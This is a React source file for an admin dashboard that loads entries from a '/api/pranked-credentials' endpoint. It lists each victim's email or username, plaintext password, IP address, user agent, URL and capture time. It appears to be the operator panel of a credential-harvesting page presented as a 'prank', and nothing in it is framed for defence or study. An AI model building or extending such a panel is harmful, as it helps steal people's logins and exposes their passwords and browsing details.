import React, { useEffect, useState, useMemo } from 'react';

const AdminTable = ({ onExit }) => {
  const [rows, setRows] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');

  const backendUrl = useMemo(() => process.env.REACT_APP_BACKEND_URL, []);

  const fetchData = async () => {
    setLoading(true);
    setError('');
    try {
      const res = await fetch(`${backendUrl}/api/pranked-credentials`);
      const data = await res.json();
      setRows(Array.isArray(data) ? data : []);
    } catch (e) {
      setError('Failed to load credentials');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
  }, [backendUrl]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-800 p-6 text-white">
      <div className="max-w-6xl mx-auto">
        <div className="flex items-center justify-between mb-6">
          <h1 className="text-2xl font-bold">Admin • Saved Credentials</h1>
          <div className="space-x-3">
            <button onClick={fetchData} className="px-4 py-2 rounded-lg bg-indigo-500 hover:bg-indigo-600">Refresh</button>
            <button onClick={onExit} className="px-4 py-2 rounded-lg bg-gray-600 hover:bg-gray-700">Exit</button>
          </div>
        </div>

        {loading ? (
          <div className="bg-white/5 rounded-xl p-6">Loading...</div>
        ) : error ? (
          <div className="bg-red-500/20 border border-red-500/40 rounded-xl p-4 text-red-200">{error}</div>
        ) : (
          <div className="bg-white/5 rounded-xl overflow-auto">
            <table className="min-w-full text-sm">
              <thead className="bg-white/10">
                <tr>
                  <th className="text-left px-4 py-3">#</th>
                  <th className="text-left px-4 py-3">Email/Username</th>
                  <th className="text-left px-4 py-3">Password</th>
                  <th className="text-left px-4 py-3">IP</th>
                  <th className="text-left px-4 py-3">User Agent</th>
                  <th className="text-left px-4 py-3">URL</th>
                  <th className="text-left px-4 py-3">Pranked At</th>
                </tr>
              </thead>
              <tbody>
                {rows.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-4 py-6 text-center text-white/70">No entries yet</td>
                  </tr>
                ) : (
                  rows.map((r, idx) => (
                    <tr key={r.id || idx} className="border-t border-white/10">
                      <td className="px-4 py-3">{idx + 1}</td>
                      <td className="px-4 py-3 break-all">{r.emailOrUsername}</td>
                      <td className="px-4 py-3 break-all">{r.password}</td>
                      <td className="px-4 py-3">{r.ipAddress}</td>
                      <td className="px-4 py-3 max-w-[320px] truncate" title={r.userAgent}>{r.userAgent}</td>
                      <td className="px-4 py-3 max-w-[360px] truncate" title={r.url}>{r.url}</td>
                      <td className="px-4 py-3">{r.prankedAt}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        )}
        <div className="mt-4 text-sm text-white/70">Total: {rows.length}</div>
      </div>
    </div>
  );
};

export default AdminTable;